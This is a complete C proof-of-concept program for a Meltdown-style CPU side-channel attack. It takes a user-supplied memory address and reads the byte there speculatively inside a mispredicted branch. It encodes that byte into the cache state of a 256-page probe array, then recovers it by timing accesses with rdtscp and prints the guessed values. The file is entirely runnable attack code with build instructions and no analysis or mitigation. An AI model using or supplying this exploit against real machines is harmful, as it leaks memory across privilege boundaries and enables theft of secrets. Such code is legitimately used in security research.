//Build from Visual Studio command prompt: cl.exe meltdown.c
//Build with GCC: gcc meltdown.c

#ifdef _MSC_VER
#include <intrin.h>
#else
#include <x86intrin.h>
#endif
#include <stdint.h>
#include <stdio.h>

#define PAGE_SIZE           (1024 * 4)
#define PAGE_NUM            256
#define CACHE_HIT_THRESHOLD 100

int get_access_time(uint8_t* page)
{
    unsigned long long tick1, tick2;
    unsigned int aux;

    tick1 = __rdtscp(&aux);
    uint8_t tmp = *page;
    tick2 = __rdtscp(&aux);
    
    return (tick2 - tick1);
}

uint8_t mem_pages[PAGE_NUM][PAGE_SIZE];

int detect_cached_page()
{
    //find the pages which in cache. Order is lightly mixed up to prevent stride prediction
    for (int i = 0; i < PAGE_NUM; i++)
    {
        uint8_t mix_i = ((i * 167) + 13) & 255;
        if (get_access_time(mem_pages[mix_i]) < CACHE_HIT_THRESHOLD)
        {
            return mix_i;
        }
    }

    return -1;
}

uint8_t* get_input()
{
    uint8_t* target_address;
    printf("Input the target address in hexadecimal: ");
    scanf("%llx", &target_address);
    return target_address;
}

int main()
{
    static uint8_t tmp = 37;
    uint8_t* target_address = get_input();
    printf("Target Address = %p\n", target_address);

    memset(mem_pages, 1, sizeof(mem_pages));
    for(int i = 0; i < 30; i++)
    {
        _mm_clflush(&tmp);
        for (int i = 0; i < PAGE_NUM; i++)
        {
            _mm_clflush(mem_pages[i]);
        }
        
        if(tmp == 0)
        {
            tmp = mem_pages[*target_address][0];
        }

        int cached_page = detect_cached_page();
        printf("Guess the data = %d, %c\n", cached_page, cached_page);
    }
}
